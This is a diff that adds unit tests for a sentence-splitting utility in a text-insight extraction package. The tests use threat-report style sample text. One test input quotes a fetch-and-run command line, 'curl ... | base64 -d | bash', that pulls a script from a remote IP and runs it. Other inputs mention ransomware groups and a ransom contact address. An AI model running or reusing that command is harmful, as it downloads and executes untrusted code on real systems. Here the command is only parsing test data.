@@ -8,6 +8,7 @@ from insight_extractor.utils import (
     compute_text_hash,
     format_timestamp,
     sanitize_filename,
+    split_sentences,
     truncate_text,
 )
 
@@ -117,3 +118,115 @@ class TestComputeTextHash:
         h = compute_text_hash("")
         assert len(h) == 16
         assert all(c in "0123456789abcdef" for c in h)
+
+
+class TestSplitSentences:
+    """split_sentences keeps wrapped prose whole and Markdown lines separate."""
+
+    def test_empty_and_markup_only_text(self) -> None:
+        assert split_sentences("") == []
+        assert split_sentences("  \n\t\n") == []
+        assert split_sentences("|---|:---:|\n┌────┐\n└────┘\n---") == []
+
+    def test_hard_wrapped_prose_is_joined_then_split_on_punctuation(self) -> None:
+        text = "The group exploited a flaw\n    to gain access. Lateral movement\nfollowed!\nDone?"
+        assert split_sentences(text) == [
+            "The group exploited a flaw to gain access.",
+            "Lateral movement followed!",
+            "Done?",
+        ]
+
+    def test_blank_line_ends_a_paragraph(self) -> None:
+        assert split_sentences("Executive summary\n\nRansomware hit ESXi hosts.") == [
+            "Executive summary",
+            "Ransomware hit ESXi hosts.",
+        ]
+
+    def test_table_rows_are_single_units_without_frames(self) -> None:
+        text = (
+            "# | Title | Turns\n"
+            "--|-------|------\n"
+            " 9 | Can Grok allow firewall changes? (research) | 1\n"
+            "| 10 | Tech News AM digest |\n"
+            "│  Coverage: 2026-01-26 through 2026-07-04. More text.   │\n"
+        )
+        assert split_sentences(text) == [
+            "# | Title | Turns",
+            "9 | Can Grok allow firewall changes? (research) | 1",
+            "10 | Tech News AM digest",
+            "Coverage: 2026-01-26 through 2026-07-04. More text.",
+        ]
+
+    def test_pipes_in_prose_are_not_table_rows(self) -> None:
+        text = (
+            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and\n"
+            "then deleted itself. IOC summary: ALPHV | BlackCat | LockBit. The first\n"
+            "two share code.\r\n"
+            "| Actor | CVE |\r\n"
+            "|---|:---:|\r\n"
+            "| ALPHV | CVE-2024-1234 |\r\n"
+            "LockBit | CVE-2023-4966 | still tracked. Another row\r\n"
+            "\r\n"
+            "After the table. Done."
+        )
+        assert split_sentences(text) == [
+            "The loader ran curl -s http://203.0.113.7/a.sh | base64 -d | bash and then "
+            "deleted itself.",
+            "IOC summary: ALPHV | BlackCat | LockBit.",
+            "The first two share code.",
+            "Actor | CVE",
+            "ALPHV | CVE-2024-1234",
+            "LockBit | CVE-2023-4966 | still tracked. Another row",
+            "After the table.",
+            "Done.",
+        ]
+
+    def test_headings_lists_and_quotes_start_new_units(self) -> None:
+        text = (
+            "### Insight 47\n"
+            "> Burnout and rage-quitting\n"
+            "- Score: `1`\n"
+            "- A long bullet that wraps\n"
+            "  onto a second line. Then a new sentence.\n"
+            "2. Numbered item\n"
+            "Plain prose after the list"
+        )
+        assert split_sentences(text) == [
+            "### Insight 47",
+            "> Burnout and rage-quitting",
+            "- Score: `1`",
+            "- A long bullet that wraps onto a second line.",
+            "Then a new sentence.",
+            "2. Numbered item Plain prose after the list",
+        ]
+
+    def test_single_pipe_and_year_prefix_stay_prose(self) -> None:
+        text = "Contact: ransom@darkmail.onion | BTC wallet\n2026. Data exfiltrated."
+        assert split_sentences(text) == [
+            "Contact: ransom@darkmail.onion | BTC wallet 2026.",
+            "Data exfiltrated.",
+        ]
+
+    def test_ordinals_and_abbreviations_do_not_end_sentences(self) -> None:
+        text = (
+            "> 4.\tAnthropomorphic patterns appear. Google told the U.S. government, "
+            "e.g. regulators, about good vs. evil framing. Dr. Smith agreed."
+        )
+        assert split_sentences(text) == [
+            "> 4. Anthropomorphic patterns appear.",
+            "Google told the U.S. government, e.g. regulators, about good vs. evil framing.",
+            "Dr. Smith agreed.",
+        ]
+
+    def test_units_and_sentence_final_abbreviations_still_split(self) -> None:
+        text = (
+            "The C2 beacon fires every 500 ms. The operator then pivots. Timeouts were "
+            "200 MS. Most victims were in the U.S. The group later expanded via St. Louis."
+        )
+        assert split_sentences(text) == [
+            "The C2 beacon fires every 500 ms.",
+            "The operator then pivots.",
+            "Timeouts were 200 MS.",
+            "Most victims were in the U.S.",
+            "The group later expanded via St. Louis.",
+        ]
